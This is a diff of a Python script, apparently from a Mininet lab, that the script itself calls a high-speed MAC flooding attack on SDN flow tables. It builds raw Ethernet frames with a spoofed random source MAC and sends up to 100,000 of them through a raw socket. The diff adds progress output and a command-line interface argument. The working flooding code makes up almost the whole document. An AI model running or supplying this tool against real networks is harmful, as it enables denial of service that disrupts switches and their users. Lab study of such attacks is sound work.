@@ -1,21 +1,28 @@
+#!/usr/bin/env python3
+"""
+High-speed MAC flooding attack for SDN flow table saturation
+"""
+
 import socket
 import struct
 import random
 import time
+import sys
 
 def generate_random_mac():
-    # Generates a random MAC address byte array
     return [random.randint(0x00, 0xff) for _ in range(6)]
 
-def run_attack(interface, num_packets):
-    print(f"[*] Starting high-speed MAC flood on {interface}...")
+def run_attack(interface="h1-eth0", num_packets=100000):
+    print(f"[*] Starting MAC flood on {interface}...")
     
-    # Create a raw socket that talks directly to the hardware
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
         s.bind((interface, 0))
     except PermissionError:
-        print("[!] Error: Must run as root (or inside Mininet CLI).")
+        print("[!] Error: Must run as root.")
+        return
+    except Exception as e:
+        print(f"[!] Error: {e}")
         return
 
     packets_sent = 0
@@ -23,30 +30,28 @@ def run_attack(interface, num_packets):
 
     try:
         for _ in range(num_packets):
-            # To saturate the switch, we spoof a completely new Source MAC every time
             src_mac = generate_random_mac()
-            dst_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x02] # Broadcast destination
+            dst_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x02] 
             
-            # Pack the raw Ethernet header: Dest MAC (6 bytes), Src MAC (6 bytes), Type (IPv4=0x0800)
+            # Ethernet header (Dest, Src, Type=IPv4)
             eth_header = struct.pack("!6B6BH", *dst_mac, *src_mac, 0x0800)
-            
-            # Add a tiny dummy payload to complete the frame
             payload = b'\x00' * 46 
-            packet = eth_header + payload
             
-            # Fire the packet directly into the wire
-            s.send(packet)
+            s.send(eth_header + payload)
             packets_sent += 1
             
+            if packets_sent % 10000 == 0:
+                print(f"[*] Sent {packets_sent} packets...")
+                
     except KeyboardInterrupt:
-        print("\n[*] Attack aborted by user.")
+        print("\n[*] Aborted.")
 
     elapsed = time.time() - start_time
-    rate = packets_sent / elapsed
-    print(f"[*] ATTACK COMPLETE")
-    print(f"[*] Sent {packets_sent} packets in {elapsed:.2f} seconds.")
-    print(f"[*] Average Rate: {rate:.0f} packets/second")
+    rate = packets_sent / elapsed if elapsed > 0 else 0
+    print(f"[*] Sent {packets_sent} packets in {elapsed:.2f}s ({rate:.0f} pps)")
 
 if __name__ == '__main__':
-    # We will blast 10,000 packets to guarantee a flow table explosion
-    run_attack("h1-eth0", 500000)
+    if len(sys.argv) > 1:
+        run_attack(sys.argv[1])
+    else:
+        run_attack()
